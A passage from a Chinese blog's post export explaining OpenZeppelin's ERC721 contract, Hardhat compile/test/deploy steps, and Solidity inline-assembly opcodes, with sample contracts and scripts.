_ownerOf(tokenId) != address(0); &#125; /** * @dev Returns whether `spender` is allowed to manage `tokenId`. * * Requirements: * * - `tokenId` must exist. */ function _isApprovedOrOwner(address spender, uint256 tokenId) internal view virtual returns (bool) &#123; address owner = ownerOf(tokenId); return (spender == owner || isApprovedForAll(owner, spender) || getApproved(tokenId) == spender); &#125; /** * @dev Safely mints `tokenId` and transfers it to `to`. * * Requirements: * * - `tokenId` must not exist. * - If `to` refers to a smart contract, it must implement &#123;IERC721Receiver-onERC721Received&#125;, which is called upon a safe transfer. * * Emits a &#123;Transfer&#125; event. */ function _safeMint(address to, uint256 tokenId) internal virtual &#123; _safeMint(to, tokenId, &quot;&quot;); &#125; /** * @dev Same as &#123;xref-ERC721-_safeMint-address-uint256-&#125;[`_safeMint`], with an additional `data` parameter which is * forwarded in &#123;IERC721Receiver-onERC721Received&#125; to contract recipients. */ function _safeMint(address to, uint256 tokenId, bytes memory data) internal virtual &#123; _mint(to, tokenId); if (!_checkOnERC721Received(address(0), to, tokenId, data)) &#123; revert ERC721InvalidReceiver(to); &#125; &#125; /** * @dev Mints `tokenId` and transfers it to `to`. * * WARNING: Usage of this method is discouraged, use &#123;_safeMint&#125; whenever possible * * Requirements: * * - `tokenId` must not exist. * - `to` cannot be the zero address. * * Emits a &#123;Transfer&#125; event. */ function _mint(address to, uint256 tokenId) internal virtual &#123; if (to == address(0)) &#123; revert ERC721InvalidReceiver(address(0)); &#125; if (_exists(tokenId)) &#123; revert ERC721InvalidSender(address(0)); &#125; _beforeTokenTransfer(address(0), to, tokenId, 1); // Check that tokenId was not minted by `_beforeTokenTransfer` hook if (_exists(tokenId)) &#123; revert ERC721InvalidSender(address(0)); &#125; unchecked &#123; // Will not overflow unless all 2**256 token ids are minted to the same owner. // Given that tokens are minted one by one, it is impossible in practice that // this ever happens. Might change if we allow batch minting. // The ERC fails to describe this case. _balances[to] += 1; &#125; _owners[tokenId] = to; emit Transfer(address(0), to, tokenId); _afterTokenTransfer(address(0), to, tokenId, 1); &#125; /** * @dev Destroys `tokenId`. * The approval is cleared when the token is burned. * This is an internal function that does not check if the sender is authorized to operate on the token. * * Requirements: * * - `tokenId` must exist. * * Emits a &#123;Transfer&#125; event. */ function _burn(uint256 tokenId) internal virtual &#123; address owner = ownerOf(tokenId); _beforeTokenTransfer(owner, address(0), tokenId, 1); // Update ownership in case tokenId was transferred by `_beforeTokenTransfer` hook owner = ownerOf(tokenId); // Clear approvals delete _tokenApprovals[tokenId]; // Decrease balance with checked arithmetic, because an `ownerOf` override may // invalidate the assumption that `_balances[from] &gt;= 1`. _balances[owner] -= 1; delete _owners[tokenId]; emit Transfer(owner, address(0), tokenId); _afterTokenTransfer(owner, address(0), tokenId, 1); &#125; /** * @dev Transfers `tokenId` from `from` to `to`. * As opposed to &#123;transferFrom&#125;, this imposes no restrictions on msg.sender. * * Requirements: * * - `to` cannot be the zero address. * - `tokenId` token must be owned by `from`. * * Emits a &#123;Transfer&#125; event. */ function _transfer(address from, address to, uint256 tokenId) internal virtual &#123; address owner = ownerOf(tokenId); if (owner != from) &#123; revert ERC721IncorrectOwner(from, tokenId, owner); &#125; if (to == address(0)) &#123; revert ERC721InvalidReceiver(address(0)); &#125; _beforeTokenTransfer(from, to, tokenId, 1); // Check that tokenId was not transferred by `_beforeTokenTransfer` hook owner = ownerOf(tokenId); if (owner != from) &#123; revert ERC721IncorrectOwner(from, tokenId, owner); &#125; // Clear approvals from the previous owner delete _tokenApprovals[tokenId]; // Decrease balance with checked arithmetic, because an `ownerOf` override may // invalidate the assumption that `_balances[from] &gt;= 1`. _balances[from] -= 1; unchecked &#123; // `_balances[to]` could overflow in the conditions described in `_mint`. That would require // all 2**256 token ids to be minted, which in practice is impossible. _balances[to] += 1; &#125; _owners[tokenId] = to; emit Transfer(from, to, tokenId); _afterTokenTransfer(from, to, tokenId, 1); &#125; /** * @dev Approve `to` to operate on `tokenId` * * Emits an &#123;Approval&#125; event. */ function _approve(address to, uint256 tokenId) internal virtual &#123; _tokenApprovals[tokenId] = to; emit Approval(ownerOf(tokenId), to, tokenId); &#125; /** * @dev Approve `operator` to operate on all of `owner` tokens * * Emits an &#123;ApprovalForAll&#125; event. */ function _setApprovalForAll(address owner, address operator, bool approved) internal virtual &#123; if (owner == operator) &#123; revert ERC721InvalidOperator(owner); &#125; _operatorApprovals[owner][operator] = approved; emit ApprovalForAll(owner, operator, approved); &#125; /** * @dev Reverts if the `tokenId` has not been minted yet. */ function _requireMinted(uint256 tokenId) internal view virtual &#123; if (!_exists(tokenId)) &#123; revert ERC721NonexistentToken(tokenId); &#125; &#125; /** * @dev Private function to invoke &#123;IERC721Receiver-onERC721Received&#125; on a target address. * The call is not executed if the target address is not a contract. * * @param from address representing the previous owner of the given token ID * @param to target address that will receive the tokens * @param tokenId uint256 ID of the token to be transferred * @param data bytes optional data to send along with the call * @return bool whether the call correctly returned the expected magic value */ function _checkOnERC721Received( address from, address to, uint256 tokenId, bytes memory data ) private returns (bool) &#123; if (to.code.length &gt; 0) &#123; try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, data) returns (bytes4 retval) &#123; return retval == IERC721Receiver.onERC721Received.selector; &#125; catch (bytes memory reason) &#123; if (reason.length == 0) &#123; revert ERC721InvalidReceiver(to); &#125; else &#123; /// @solidity memory-safe-assembly assembly &#123; revert(add(32, reason), mload(reason)) &#125; &#125; &#125; &#125; else &#123; return true; &#125; &#125; /** * @dev Hook that is called before any token transfer. This includes minting and burning. If &#123;ERC721Consecutive&#125; is * used, the hook may be called as part of a consecutive (batch) mint, as indicated by `batchSize` greater than 1. * * Calling conditions: * * - When `from` and `to` are both non-zero, ``from``&#x27;s tokens will be transferred to `to`. * - When `from` is zero, the tokens will be minted for `to`. * - When `to` is zero, ``from``&#x27;s tokens will be burned. * - `from` and `to` are never both zero. * - `batchSize` is non-zero. * * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks]. */ function _beforeTokenTransfer(address from, address to, uint256 firstTokenId, uint256 batchSize) internal virtual &#123;&#125; /** * @dev Hook that is called after any token transfer. This includes minting and burning. If &#123;ERC721Consecutive&#125; is * used, the hook may be called as part of a consecutive (batch) mint, as indicated by `batchSize` greater than 1. * * Calling conditions: * * - When `from` and `to` are both non-zero, ``from``&#x27;s tokens were transferred to `to`. * - When `from` is zero, the tokens were minted for `to`. * - When `to` is zero, ``from``&#x27;s tokens were burned. * - `from` and `to` are never both zero. * - `batchSize` is non-zero. * * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks]. */ function _afterTokenTransfer(address from, address to, uint256 firstTokenId, uint256 batchSize) internal virtual &#123;&#125; /** * @dev Unsafe write access to the balances, used by extensions that &quot;mint&quot; tokens using an &#123;ownerOf&#125; override. * * WARNING: Anyone calling this MUST ensure that the balances remain consistent with the ownership. The invariant * being that for any address `a` the value returned by `balanceOf(a)` must be equal to the number of tokens such * that `ownerOf(tokenId)` is `a`. */ // solhint-disable-next-line func-name-mixedcase function __unsafe_increaseBalance(address account, uint256 value) internal &#123; _balances[account] += value; &#125;&#125; 3.1 解读代码 using Strings for uint256;: 使 uint256类型的变量拥有 string库的功能 string private _name; ：合约的名字 for IERC721Metadata中的定义 string private _symbol;：合约的标志 for IERC721Metadata中的定义 mapping(uint256 =&gt; address) private _owners;：某 token的拥有者owners mapping(address =&gt; uint256) private _balances;：某地址所拥有的token数量 mapping(uint256 =&gt; address) private _tokenApprovals;：tokenID 到 授权地址 的授权映射 mapping(address =&gt; mapping(address =&gt; bool)) private _operatorApprovals;： owner地址。到operator地址 的批量授权映射 function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool)：实现IERC165接口supportsInterface，用来验证给合约使用实现某些接口合约 function balanceOf(address owner) public view virtual returns (uint256)：实现IERC721的balanceOf，利用_balances变量查询owner地址的balance function ownerOf(uint256 tokenId) public view virtual returns (address)：实现IERC721的ownerOf，利用_owners变量查询tokenId的owner function name() public view virtual returns (string memory)：返回NFT的 name function symbol() public view virtual returns (string memory)：返回NFT的 symbol function tokenURI(uint256 tokenId) public view virtual returns (string memory)：返回NFT的tokenURL function _baseURI() internal view virtual returns (string memory)：tokenURL的一般构建方式是，string.concat(baseURI, tokenId.toString()) function approve(address to, uint256 tokenId) public virtual：调用者 msgSender 对账号 to 授予 tokenID的行使权 function getApproved(uint256 tokenId) public view virtual returns (address)：获取代币 tokenID 的被授权用户地址 function setApprovalForAll(address operator, bool approved) public virtual：msg.sender 将自己所有的代币的行使授予operator账户（授予、回收） function isApprovedForAll(address owner, address operator) public view virtual returns (bool)：判断owner是否对operator进行所有代币授权 function transferFrom(address from, address to, uint256 tokenId) public virtual：代币转移，将tokenID从账户from转到to账户 function safeTransferFrom(address from, address to, uint256 tokenId) public virtual：安全代币转移 function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory data) public virtual：安全代币转移，携带回调数据 data function _safeTransfer(address from, address to, uint256 tokenId, bytes memory data) internal virtual：实际执行代币转移 function _ownerOf(uint256 tokenId) internal view virtual returns (address)：获取某代币的所有者 function _exists(uint256 tokenId) internal view virtual returns (bool)：验证某代币是否存在 function _isApprovedOrOwner(address spender, uint256 tokenId) internal view virtual returns (bool)：判断地址是否为代币的owner或者是拥有代币行使权的账号 function _safeMint(address to, uint256 tokenId) internal virtual：安全铸造NFT函数 function _safeMint(address to, uint256 tokenId, bytes memory data) internal virtual：真实铸NFT函数 function _mint(address to, uint256 tokenId) internal virtual：铸造NFT函数 function _burn(uint256 tokenId) internal virtual：代币注销 function _transfer(address from, address to, uint256 tokenId) internal virtual：内部执行真实的转移 function _approve(address to, uint256 tokenId) internal virtual：授权to账户tokenID的行使权 function _setApprovalForAll(address owner, address operator, bool approved) internal virtual：owner 授予&#x2F;回收 operator 对自己所有代币的权限 function _requireMinted(uint256 tokenId) internal view virtual ：判断 tokenID是否被铸造 function _checkOnERC721Received：检测要转移代币的目的地址是否实现了IERC721Receiver接口，如不存在将会永远失去转移的资金 function _beforeTokenTransfer(address from, address to, uint256 firstTokenId, uint256 batchSize) internal virtual ：钩子函数 当“from”和“to”都非零时，“from”的令牌将被转移到“to”。 当“from”为零时，代币将被铸造为“to”。 当“to”为零时，“from”的令牌将被烧毁。 “from”和“to”永远不会同时为零。 “批处理大小”不为零。 function _afterTokenTransfer(address from, address to, uint256 firstTokenId, uint256 batchSize) internal virtual ：钩子函数 *警告：任何调用此电话的人必须确保余额与所有权保持一致。不变性 对于任何地址“a”，“balanceOf（a）”返回的值必须等于这样的令牌数量 ‘ownerOf（tokenId）’ 是 ‘a’。 3.2 发行ERC721 NFT123456789101112131415161718192021222324// SPDX-License-Identifier: MIT// by 0xAApragma solidity ^0.8.4;import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol&quot;;contract WTFApe is ERC721&#123; uint public MAX_APES = 10000; // 总量 // 构造函数 constructor(string memory name_, string memory symbol_) ERC721(name_, symbol_)&#123; &#125; //BAYC的baseURI为ipfs://QmeSjSinHpPnmXmspMjwiXyN6zS4E9zccariGR3jxcaWtq/ function _baseURI() internal pure override returns (string memory) &#123; return &quot;ipfs://QmeSjSinHpPnmXmspMjwiXyN6zS4E9zccariGR3jxcaWtq/&quot;; &#125; // 铸造函数 function mint(address to, uint tokenId) external &#123; require(tokenId &gt;= 0 &amp;&amp; tokenId &lt; MAX_APES, &quot;tokenId out of range&quot;); _mint(to, tokenId); &#125;&#125; 参考链接 注意：被授权不等于可以直接对被授权的代币进行交易","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ERC","slug":"Smart-contracts/ERC","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ERC/"}],"tags":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/tags/Smart-contracts/"},{"name":"ERC","slug":"ERC","permalink":"https://biyouqiuqiu.com/tags/ERC/"},{"name":"ERC721","slug":"ERC721","permalink":"https://biyouqiuqiu.com/tags/ERC721/"}]},{"title":"hardhat_self","slug":"Hardhat/Basic_Knowledge/hardhat_self","date":"2023-07-04T05:47:10.000Z","updated":"2023-07-04T05:47:10.000Z","comments":true,"path":"2023/07/04/Hardhat/Basic_Knowledge/hardhat_self/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/04/Hardhat/Basic_Knowledge/hardhat_self/","excerpt":"","text":"官方文档 中文文档1. 基本指令(编译、测试、部署)1.1 执行 npx hardhat报错 原因： 缺少”@nomicfoundation/hardhat-toolbox“Hardhat插件。 解决方案： 1npm install --save-dev @nomicfoundation/hardhat-toolbox 如果报以下错误，则再执行一遍 npm install --save-dev @nomicfoundation/hardhat-toolbox即可 1.2 编译合约1npx hardhat compile 1.3 运行测试1npx hardhat test test/Lock.js 如果因为之前在对合约的创建的时候，文件名和合约名不一样，重命名会出现test报错的情况，解决方法就是，将当前工作目录下编译生成的artifacts和cache文件删除，再执行npx hardhat compile，重新编译。 1.4 运行js文件(部署合约)1npx hardhat run scripts/deploy.js 1.5 将钱包或dapp连接到hardhat网络1npx hardhat node 1npx hardhat run scripts/deploy.js --network localhost 注：需要将本地网络启动，即需要开启两个终端，一个用于挂载网络，一个用于测试 2. 创建一个基本的项目2.1 创建命令在你要创建项目的文件夹（空文件夹）下执行如下命令： 1npx hardhat 初始化的项目结构如下： 1234contracts/scripts/test/hardhat.config.js contracts/是合同源文件所在的位置。 test/是你的测试应该去的地方。 scripts/这是简单的自动化脚本所在的位置。 3. 对合约进行测试3.1 语法格式123456const &#123; ethers &#125; = require(&quot;hardhat&quot;);describe(&quot;&quot;/* 自定义本次测试名 */,function()&#123; it(&quot;&quot;/* 自定义dan&#x27;yuan测试名 */, async function () &#123; /* your code*/ &#125;);&#125;); 3.2 测试合约（无参构造器） MyContract1.sol： 123456789101112131415161718// SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.0;import &quot;hardhat/console.sol&quot;;contract MyContract1 &#123; address owner; constructor() &#123; owner = msg.sender; &#125; function getOwner() external view returns(address) &#123; console.log(unicode&quot;这是一个测试合约！&quot;); return owner; &#125;&#125; 解读： import &quot;hardhat/console.sol&quot;：其作用是从hardhat文件夹下引入console.sol合约 （但是我翻了个遍，在本地都找不到这个合约）; console.log()：其作用是在控制台打印输出自定义结果； unicode&quot;这是一个测试合约！&quot;：其作用是为了输出中文（solidity中不支持直接输出中文）在汉字字符串前加上unicode。 MyContract1.js： 1234567891011121314const &#123; ethers &#125; = require(&quot;hardhat&quot;); describe(&quot;MyContract&quot;, function () &#123; it(&quot;Here is demo&quot;, async function () &#123; const myContract = await ethers.getContractFactory(&quot;MyContract1&quot;); // const con = await myContract.deploy(); const owner = await con.getOwner(); console.log(&quot;MyContract 的拥有者是 &quot; + owner); &#125;); &#125;); 解读： describe(&quot;MyContract&quot;, function ()&#123;&#125;): 创建测试套件，名称为 “MyContract”; it(&quot;Here is demo&quot;, async function () &#123;&#125; ：创建测试用例，名称为 “Here is demo”(可以在一个describe中创建多个it)； const myContract = await ethers.getContractFactory(&quot;MyContract1&quot;)： 获取 “MyContract1” 智能合约的工厂对象； const con = await myContract.deploy()： 部署 “MyContract1” 智能合约； const owner = await con.getOwner()： 调用智能合约中的 getOwner() 方法获取合约的拥有者。 3.3 测试合约（有参构造器） MyContract2.sol： 123456789101112131415161718192021222324252627282930// SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.9;import &quot;hardhat/console.sol&quot;;contract MyContract2 &#123; address owner; string name; constructor(string memory _name) &#123; owner = msg.sender; name = _name; &#125; function getOwner() external view returns(address) &#123; return owner; &#125; function print() external view &#123; console.log(unicode&quot;这是MyContract1合约&quot;); &#125; function setName(string memory _name) external &#123; name = _name; &#125; function getName() external view returns(string memory) &#123; return name; &#125;&#125; MyContract2.js： 1234567891011121314151617181920212223242526272829303132const &#123; ethers &#125; = require(&quot;hardhat&quot;);// const &#123; ethers &#125; = require(&quot;ethers&quot;);describe(&quot;MyContract2&quot;, async function () &#123; it(&quot;To test ethers.provider.getStorageAt()&quot;, async function()&#123; const MyContract2 = await ethers.getContractFactory(&quot;MyContract2&quot;); // console.log(MyContract1); const contract = await MyContract2.deploy(&quot;libiyou&quot;); console.log(contract); const owner = await contract.getOwner(); console.log(`owner =&gt; $&#123;owner&#125;`); const name1 = await contract.getName(); console.log(`name1 =&gt; $&#123;name1&#125;`); await contract.setName(&quot;biyou&quot;); const name2 = await contract.getName(); console.log(`name2 =&gt; $&#123;name2&#125;`); await contract.print(); // const salt0 = await ethers.provider.getStorage(&quot;0x5FbDB2315678afecb367f032d93F642f64180aa3&quot;,0); // console.log(salt0); &#125;)&#125;) 4. 将合约部署到本地开发节点4.1 语法格式启动本地节点命令： 1npx hardhat node npx命令： 1npx hardhat run scripts/deploy_MyContract2.js --network localhost js代码： 123456789101112const hre = require(&quot;hardhat&quot;);async function main() &#123; const toDeployContract = &quot;&quot;; // 要部署的合约名 const contract = await hre.ethers.deployContract(toDeployContract,[params...]/* 构造器的形参个数 */,&#123; value: // 给合约注入的金额 &#125;);&#125;main().catch((error) =&gt; &#123; console.error(error);&#125;) 4.2 部署合约 （无参构造器）MyContract1.sol： 1234567891011121314151617181920212223242526272829// SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.9;import &quot;hardhat/console.sol&quot;;contract MyContract1 &#123; address owner; string name; constructor() &#123; owner = msg.sender; &#125; function getOwner() external view returns(address) &#123; return owner; &#125; function print() external view &#123; console.log(unicode&quot;这是MyContract1合约&quot;); &#125; function setName(string memory _name) external &#123; name = _name; &#125; function getName() external view returns(string memory) &#123; return name; &#125;&#125; deploy_MyContract1.js： 12345678910111213141516171819const hre = require(&quot;hardhat&quot;);async function main() &#123; const contract = await hre.ethers.deployContract(&quot;MyContract1&quot;); // console.log(contract); await contract.waitForDeployment(); console.log(await contract.getAddress()); await contract.setName(&quot;biyou&quot;); let name1 = await contract.getName(); console.log(name1); contract.print();&#125;main().catch((error) =&gt; &#123; console.error(error);&#125;) 运行结果： 4.3 部署合约 （有参构造器）MyContract2.sol： 123456789101112131415161718192021222324252627282930// SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.9;import &quot;hardhat/console.sol&quot;;contract MyContract2 &#123; address owner; string name; constructor(string memory _name) &#123; owner = msg.sender; name = _name; &#125; function getOwner() external view returns(address) &#123; return owner; &#125; function print() external view &#123; console.log(unicode&quot;这是MyContract1合约&quot;); &#125; function setName(string memory _name) external &#123; name = _name; &#125; function getName() external view returns(string memory) &#123; return name; &#125;&#125; deploy_MyContract2.js： 12345678910111213141516171819202122232425const hre = require(&quot;hardhat&quot;);const &#123; ethers &#125; = require(&quot;hardhat&quot;);async function main() &#123; // [&quot;lby&quot;] 表示往构造器中传入参数 const contract = await hre.ethers.deployContract(&quot;MyContract2&quot;,[&quot;lby&quot;]); const address = await contract.getAddress(); console.log(address); let slot0 = await ethers.provider.getStorage(address, 0); let slot1 = await ethers.provider.getStorage(address, 1); console.log(`slot0 =&gt; $&#123;slot0&#125;\\nslot1 =&gt; $&#123;slot1&#125;`); await contract.setName(&quot;biyou&quot;); let name = await contract.getName(); console.log(`name =&gt; $&#123;name&#125;`); slot0 = await ethers.provider.getStorage(address, 0); slot1 = await ethers.provider.getStorage(address, 1); console.log(`slot0 =&gt; $&#123;slot0&#125;\\nslot1 =&gt; $&#123;slot1&#125;`);&#125;main().catch((error)=&gt;&#123; console.log(error);&#125;) 运行结果： 5. 将合约部署到测试网络这里以polygon为例 polygon faucet链接 polygonscan链接 视频教学 5.1 先启动 hardhat本地开发节点命令： 1npx hardhat node 5.2 编写配置文件*hardhat.config.js*： 123456789101112networks: &#123; localhoat: &#123; url: &quot;http://127.0.0.1:8545&quot;, chainId: 31337, accounts: [process.env.PRIVATE_KEY] &#125;, polygon: &#123; url: &quot;&#x27;https://matic-mumbai.chainstacklabs.com&quot;, chainId: 80001, accounts: [POLYGON_PRIVATE_KEY] &#125; &#125; 5.3 将本地节点导入小狐狸钱包 5.4 到 polygon 水龙头领取测试币 5.将合约部署到polygon测试网执行如下命令 1npx hardhat run scripts/deploy_MyContract2.js --network polygon","categories":[{"name":"Hardhat","slug":"Hardhat","permalink":"https://biyouqiuqiu.com/categories/Hardhat/"},{"name":"Basic_Knowledge","slug":"Hardhat/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Hardhat/Basic-Knowledge/"}],"tags":[{"name":"hardhat","slug":"hardhat","permalink":"https://biyouqiuqiu.com/tags/hardhat/"}]},{"title":"内联汇编","slug":"Solidity/Basic_Knowledge/内联汇编","date":"2023-07-01T00:47:10.000Z","updated":"2023-07-01T00:47:10.000Z","comments":true,"path":"2023/07/01/Solidity/Basic_Knowledge/内联汇编/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/01/Solidity/Basic_Knowledge/%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96/","excerpt":"","text":"官方文档✈注：solidity内联汇编中都是以字节为单位的，[0x00,0x20)表示的范围是2^32-1,但在计算机中占了256位，256 &#x2F;8&#x3D;32&#x3D;0x20 1. 语法和 solidity一样，Assembly 也会解析注释、文字和标识符，所以你可以使用通常的 // 和 /* */ 来进行注释。 内联汇编程序由 assembly &#123; ... &#125; 来标记，在这些大括号内可以使用以下内容。 字面常数，也就是 0x123、42 或 &quot;abc&quot; （不超过 32 个字符的字符串） 操作码（在“instruction style”内），比如 mload sload dup1 sstore，操作码列表请看后面 函数风格操作码，比如 add(1，mlod(0)) 标签，比如 name: 变量声明，比如 let x := 7、let x := add(y, 3) 或者 let x （初始值将被置为 empty(0)） 标识符（标签或者汇编局部变量以及用作内联汇编时的外部变量），比如 jump(name)、3 x add 赋值（在“instruction style”内），比如 3 =: x 函数风格赋值，比如 x := add(y，3) 一些控制局部变量作用域的语句块，比如 &#123;let x := 3 &#123; let y := add(x，1) &#125;&#125; 2. 常用操作码注：在下表中，mem[a...b) 表示从位置 a 开始至（不包括）位置 b 的内存字节数，storage[p] 表示位置 p 处的存储内容。 Instruction Explanation stop - F 停止执行，与 return(0,0) 等价 add(x, y) F x + y sub(x, y) F x - y mul(x, y) F x * y div(x, y) F x &#x2F; y sdiv(x, y) F x &#x2F; y，以二进制补码作为符号 mod(x, y) F x % y smod(x, y) F x % y，以二进制补码作为符号 exp(x, y) F x 的 y 次幂 not(x) F ~x，对 x 按位取反 lt(x, y) F 如果 x &lt; y 为 1，否则为 0 gt(x, y) F 如果 x &gt; y 为 1，否则为 0 slt(x, y) F 如果 x &lt; y 为 1，否则为 0，以二进制补码作为符号 sgt(x, y) F 如果 x &gt; y 为 1，否则为 0，以二进制补码作为符号 eq(x, y) F 如果 x &#x3D;&#x3D; y 为 1，否则为 0 iszero(x) F 如果 x &#x3D;&#x3D; 0 为 1，否则为 0 and(x, y) F x 和 y 的按位与 or(x, y) F x 和 y 的按位或 xor(x, y) F x 和 y 的按位异或 byte(n, x) F x 的第 n 个字节，这个索引是从 0 开始的 shl(x, y) C 将 y 逻辑左移 x 位 shr(x, y) C 将 y 逻辑右移 x 位 sar(x, y) C 将 y 算术右移 x 位 addmod(x, y, m) F 任意精度的 (x + y) % m mulmod(x, y, m) F 任意精度的 (x * y) % m signextend(i, x) F 对 x 的最低位到第 (i * 8 + 7) 进行符号扩展 keccak256(p, n) F keccak(mem[p…(p + n))) jump(label) - F 跳转到标签 &#x2F; 代码位置 jumpi(label, cond) - F 如果条件为非零，跳转到标签 pc F 当前代码位置 pop(x) - F 删除（弹出）栈顶的 x 个元素 dup1 … dup16 F 将栈内第 i 个元素（从栈顶算起）复制到栈顶 swap1 … swap16 * F 将栈顶元素和其下第 i 个元素互换 mload(p) F mem[p…(p + 32)) mstore(p, v) - F mem[p…(p + 32)) :&#x3D; v mstore8(p, v) - F mem[p] :&#x3D; v &amp; 0xff （仅修改一个字节） sload(p) F storage[p] sstore(p, v) - F storage[p] :&#x3D; v msize F 内存大小，即最大可访问内存索引 gas F 执行可用的 gas address F 当前合约 &#x2F; 执行上下文的地址 balance(a) F 地址 a 的余额，以 wei 为单位 caller F 调用发起者（不包括 delegatecall） callvalue F 随调用发送的 Wei 的数量 calldataload(p) F 位置 p 的调用数据（32 字节） calldatasize F 调用数据的字节数大小 calldatacopy(t, f, s) - F 从调用数据的位置 f 的拷贝 s 个字节到内存的位置 t codesize F 当前合约 &#x2F; 执行上下文地址的代码大小 codecopy(t, f, s) - F 从代码的位置 f 开始拷贝 s 个字节到内存的位置 t extcodesize(a) F 地址 a 的代码大小 extcodecopy(a, t, f, s) - F 和 codecopy(t, f, s) 类似，但从地址 a 获取代码 returndatasize B 最后一个 returndata 的大小 returndatacopy(t, f, s) - B 从 returndata 的位置 f 拷贝 s 个字节到内存的位置 t create(v, p, s) F 用 mem[p…(p + s)) 中的代码创建一个新合约、发送 v wei 并返回 新地址 create2(v, n, p, s) C 用 mem[p…(p + s)) 中的代码，在地址 keccak256( . n . keccak256(mem[p…(p + s))) 上 创建新合约、发送 v wei 并返回新地址 call(g, a, v, in, insize, out, outsize) F 使用 mem[in…(in + insize)) 作为输入数据， 提供 g gas 和 v wei 对地址 a 发起消息调用， 输出结果数据保存在 mem[out…(out + outsize))， 发生错误（比如 gas 不足）时返回 0，正确结束返回 1 callcode(g, a, v, in, insize, out, outsize) F 与 call 等价，但仅使用地址 a 中的代码 且保持当前合约的执行上下文 delegatecall(g, a, in, insize, out, outsize) F 与 callcode 等价且保留 caller 和 callvalue staticcall(g, a, in, insize, out, outsize) F 与 call(g, a, 0, in, insize, out, outsize) 等价 但不允许状态修改 return(p, s) - F 终止运行，返回 mem[p…(p + s)) 的数据 revert(p, s) - B 终止运行，撤销状态变化，返回 mem[p…(p + s)) 的数据 selfdestruct(a) - F 终止运行，销毁当前合约并且把资金发送到地址 a invalid - F 以无效指令终止运行 log0(p, s) - F 以 mem[p…(p + s)) 的数据产生不带 topic 的日志 log1(p, s, t1) - F 以 mem[p…(p + s)) 的数据和 topic t1 产生日志 log2(p, s, t1, t2) - F 以 mem[p…(p + s)) 的数据和 topic t1、t2 产生日志 log3(p, s, t1, t2, t3) - F 以 mem[p…(p + s)) 的数据和 topic t1、t2、t3 产生日志 log4(p, s, t1, t2, t3, t4) - F 以 mem[p…(p + s)) 的数据和 topic t1、t2、t3 和 t4 产生日志 origin F 交易发起者地址 gasprice F 交易所指定的 gas 价格 blockhash(b) F 区块号 b 的哈希 - 目前仅适用于不包括当前区块的最后 256 个区块 coinbase F 当前的挖矿收益者地址 timestamp F 从当前 epoch 开始的当前区块时间戳（以秒为单位） number F 当前区块号 difficulty F 当前区块难度 gaslimit F 当前区块的 gas 上限 2.1 基础操作码的演示2.1.1 mstore的用法语法： 1mstore(position, value) 其中，position 是要写入的内存位置，以字节为单位；value 是要写入的数据。注意，value 的大小必须是 32 字节。 演示： 1234567function mstore() external pure returns(uint) &#123; // 123 uint num = 123; assembly &#123; mstore(0x00, num) // 或 mstore(0x00, 123) return(0x00, 0x20) &#125;&#125; 返回的结果： 2.1.2 return的用法语法： 1return(start, end) 其中start 是要读取的起始内存位置，以字节为单位；end 是要读取的结尾内存位置。注意，end 的大小必须是 32 字节的倍数。 示例： 一个返回值： 12345678function _return1() external pure returns(uint) &#123; uint num = 999; assembly &#123; mstore(0x00, num) mstore(0x20, 33) return(0x20, 0x40) &#125;&#125; 一个以上的返回值： 如果函数有多个返回值，则必须将它们打包成一个元组 12345678function _return2() external pure returns(uint,uint) &#123; uint num = 666; assembly &#123; mstore(0x00, num) mstore(0x20, 999) return(0x00, 0x40) &#125;&#125; 两个示例的运行结果： 2.1.3 算术运算add，sub，mul，div，mod，exp的用法语法： 123456add(value1, value2)sub(value1, value2)mul(value1, value2)div(value1, value2)mod(value1, value2)exp(value1, value2) 其中，value1 和 value2 是要相加，减，乘，除，取模，幂运算的两个值。 示例： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647function add(uint x, uint y) external pure returns(uint) &#123; assembly &#123; let result := add(x, y) mstore(0x00, result) return(0x00, 0x20) &#125;&#125;function sub(uint x, uint y) external pure returns(uint) &#123; assembly &#123; let result := sub(x, y) mstore(0x00, result) return(0x00, 0x20) &#125;&#125;function mul(uint x, uint y) external pure returns(uint) &#123; assembly &#123; let result := mul(x, y) mstore(0x00, result) return(0x00, 0x20) &#125;&#125;function div(uint x, uint y) external pure returns(uint) &#123; assembly &#123; let result := div(x, y) mstore(0x00, result) return(0x00, 0x20) &#125;&#125;function mod(uint x, uint y) external pure returns(uint) &#123; assembly &#123; let result := mod(x, y) mstore(0x00, result) return(0x00, 0x20) &#125;&#125;function exp(uint x, uint y) external pure returns(uint) &#123; assembly &#123; let result := exp(x, y) mstore(0x00, result) return(0x00, 0x20) &#125;&#125; 运行结果： 2.1.4 位运算：not,and,or,xor,shl,shr,sar位运算知识库 1234567not(x) // ~x，对 x 按位取反and(x,y) // x 和 y 的按位与or(x,y) // x 和 y 的按位或xor(x,y) // x 和 y 的按位异或shl(x,y) // 将 y 逻辑左移 x 位shr(x,y) // 将 y 逻辑右移 x 位sar(x,y) // 将 y 算术右移 x 位 示例： uint的取值的范围是：[0,115792089237316195423570985008687907853269984665640564039457584007913129639935] 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182/*0:uint256: 11:uint256:115792089237316195423570985008687907853269984665640564039457584007913129639934*/function not(uint num) external pure returns(uint, uint) &#123; assembly &#123; let result := num mstore(0x00, result) mstore(0x20, not(result)) return(0x00,64) &#125;&#125;// 1010// 1011// 1010 = 10function and(uint n1, uint n2) external pure returns(uint) &#123; assembly &#123; let result := 